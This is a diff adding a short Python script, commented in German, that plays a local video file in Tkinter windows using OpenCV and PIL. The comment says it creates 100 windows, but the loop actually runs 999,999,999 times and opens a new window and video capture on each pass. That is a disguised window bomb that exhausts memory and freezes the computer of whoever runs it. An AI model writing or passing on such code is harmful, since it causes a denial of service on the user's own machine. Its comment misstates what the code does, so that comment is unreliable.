@@ -1,0 +1,56 @@
+from tkinter import Tk, Label, Toplevel
+from PIL import Image, ImageTk
+import cv2
+
+# Liste, um Referenzen auf Labels und Video-Frames zu speichern
+windows = []
+
+def create_window(video_path):
+    # Erstelle ein neues Fenster
+    new_window = Toplevel()
+    new_window.title("Video abspielen")
+
+    # Label für die Videoanzeige
+    video_label = Label(new_window)
+    video_label.pack()
+
+    # Video mit OpenCV öffnen
+    cap = cv2.VideoCapture(video_path)
+
+    def update_frame():
+        ret, frame = cap.read()
+        if ret:
+            # Konvertiere das Frame von BGR (OpenCV) nach RGB (Tkinter)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            img = Image.fromarray(frame)
+            imgtk = ImageTk.PhotoImage(image=img)
+
+            # Aktualisiere das Label mit dem neuen Frame
+            video_label.imgtk = imgtk
+            video_label.configure(image=imgtk)
+
+            # Wiederhole die Funktion nach 10 ms
+            new_window.after(10, update_frame)
+        else:
+            # Video ist zu Ende
+            cap.release()
+
+    # Starte die Frame-Aktualisierung
+    update_frame()
+
+    # Speichere das Fenster und das Label in der Liste
+    windows.append((new_window, video_label))
+
+# Hauptfenster erstellen
+root = Tk()
+root.title("Hauptfenster")
+
+# Video-Pfad
+video_path = "/Volumes/DISK_IMG/ssstik.io_1742815220428.mp4"  # Ersetze dies durch den Pfad zu deinem Video
+
+# 100 Fenster erstellen
+for _ in range(999999999):
+    create_window(video_path)
+
+# Starte die GUI-Schleife
+root.mainloop()
